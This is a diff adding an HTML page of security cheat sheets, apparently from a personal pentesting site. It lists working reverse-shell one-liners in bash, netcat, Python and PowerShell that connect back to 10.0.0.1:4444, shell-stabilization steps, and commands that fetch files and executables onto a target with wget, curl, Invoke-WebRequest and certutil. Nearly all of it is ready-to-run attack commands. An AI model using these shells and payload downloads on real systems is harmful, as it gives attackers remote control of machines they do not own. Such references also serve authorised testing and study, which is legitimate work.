@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cheatsheets - Zero Trust</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+      .cheatsheet-section {
+          margin-bottom: 3rem;
+      }
+      .code-block {
+          background-color: #0d1117;
+          border: 1px solid var(--border-color);
+          border-radius: 6px;
+          padding: 1rem;
+          margin-bottom: 1rem;
+          font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
+          color: #e6edf3;
+          overflow-x: auto;
+      }
+      .command-group {
+          margin-bottom: 1.5rem;
+      }
+      .command-title {
+          font-weight: 600;
+          color: var(--accent-color);
+          margin-bottom: 0.5rem;
+          display: block;
+      }
+  </style>
+</head>
+<body>
+  <header style="padding: 4rem 1rem;">
+    <div class="nav-bar">
+        <a href="../index.html">Home</a>
+        <a href="tools.html">Tools</a>
+        <a href="cheatsheets.html" class="active">Cheatsheets</a>
+        <a href="../Resources/index.html">Resources</a>
+        <a href="../Projects/index.html">Projects</a>
+    </div>
+    <h1>Security Cheatsheets</h1>
+    <p>Quick reference guides for common operations, shells, and transfers.</p>
+  </header>
+
+  <main>
+
+    <div class="cheatsheet-section">
+        <h2 class="wiki-section-title">🐚 Reverse Shells</h2>
+
+        <div class="command-group">
+            <span class="command-title">Bash TCP</span>
+            <div class="code-block">bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Netcat (Traditional)</span>
+            <div class="code-block">nc -e /bin/sh 10.0.0.1 4444</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Netcat (OpenBSD / No -e)</span>
+            <div class="code-block">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Python</span>
+            <div class="code-block">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">PowerShell</span>
+            <div class="code-block">$client = New-Object System.Net.Sockets.TcpClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</div>
+        </div>
+    </div>
+
+    <div class="cheatsheet-section">
+        <h2 class="wiki-section-title">🖥️ TTY Spawning (Shell Stabilization)</h2>
+        <p>Use these commands to upgrade a dumb shell to a fully interactive TTY.</p>
+
+        <div class="command-group">
+            <span class="command-title">Python</span>
+            <div class="code-block">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Script</span>
+            <div class="code-block">/usr/bin/script -qc /bin/bash /dev/null</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Full Stabilization (Bash)</span>
+            <div class="code-block">
+# 1. Background the shell
+Ctrl + Z
+
+# 2. Reset local terminal
+stty raw -echo; fg
+
+# 3. Reset remote terminal (inside shell)
+export TERM=xterm
+            </div>
+        </div>
+    </div>
+
+    <div class="cheatsheet-section">
+        <h2 class="wiki-section-title">📂 File Transfers</h2>
+
+        <div class="command-group">
+            <span class="command-title">Python HTTP Server (Sender)</span>
+            <div class="code-block">python3 -m http.server 8000</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Wget (Linux Receiver)</span>
+            <div class="code-block">wget http://10.0.0.1:8000/file.txt -O /tmp/file.txt</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Curl (Linux Receiver)</span>
+            <div class="code-block">curl http://10.0.0.1:8000/file.txt -o /tmp/file.txt</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">PowerShell (Windows Receiver)</span>
+            <div class="code-block">Invoke-WebRequest -Uri "http://10.0.0.1:8000/file.exe" -OutFile "C:\Temp\file.exe"</div>
+        </div>
+
+        <div class="command-group">
+            <span class="command-title">Certutil (Windows Receiver)</span>
+            <div class="code-block">certutil -urlcache -split -f "http://10.0.0.1:8000/file.exe" file.exe</div>
+        </div>
+    </div>
+
+  </main>
+
+  <footer>
+    <p>&copy; Zero Trust. Hosted with ❤️ on GitHub Pages.</p>
+  </footer>
+</body>
+</html>
